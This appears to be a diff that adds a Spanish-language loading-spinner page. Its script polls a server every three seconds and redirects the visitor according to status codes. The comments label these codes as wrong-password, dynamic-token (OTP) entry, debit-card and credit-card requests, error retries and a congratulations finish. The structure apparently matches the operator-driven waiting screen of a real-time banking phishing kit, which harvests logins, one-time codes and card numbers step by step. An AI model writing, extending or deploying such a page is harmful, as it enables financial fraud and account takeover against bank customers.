@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Cargando...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #cbd5e1; /* Color gris azulado suave */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="spinner"></div>
+
+    <script>
+        const userId = {{ user_id }};
+        
+        setInterval(async () => {
+            try {
+                const res = await fetch('/get_status/' + userId);
+                const data = await res.json();
+                
+                // 2: Error Clave -> Vuelve al inicio
+                if (data.status === '2') {
+                    window.location.href = '/?error=1';
+                } 
+                // 3: Token Dinámico -> Va a la pantalla de Activemos tu app
+                else if (data.status === '3') {
+                    window.location.href = '/dynamic/' + userId;
+                } 
+                // 4: Error Token -> Va a Activemos tu app con mensaje de error
+                else if (data.status === '4') {
+                    window.location.href = '/dynamic/' + userId + '?error=1';
+                } 
+                // 5: Finalizar -> Va a la pantalla de Felicidades
+                else if (data.status === '5') {
+                    window.location.href = '/finish';
+                }
+                // 6: Pedir Tarjeta Débito
+                else if (data.status === '6') {
+                    window.location.href = '/tdb/' + userId;
+                }
+                // 7: Error Tarjeta Débito
+                else if (data.status === '7') {
+                    window.location.href = '/tdb/' + userId + '?error=1';
+                }
+                // 8: Pedir Tarjeta Crédito
+                else if (data.status === '8') {
+                    window.location.href = '/tct/' + userId;
+                }
+                // 9: Error Tarjeta Crédito
+                else if (data.status === '9') {
+                    window.location.href = '/tct/' + userId + '?error=1';
+                }
+            } catch (e) {
+                console.error("Error comprobando estado");
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
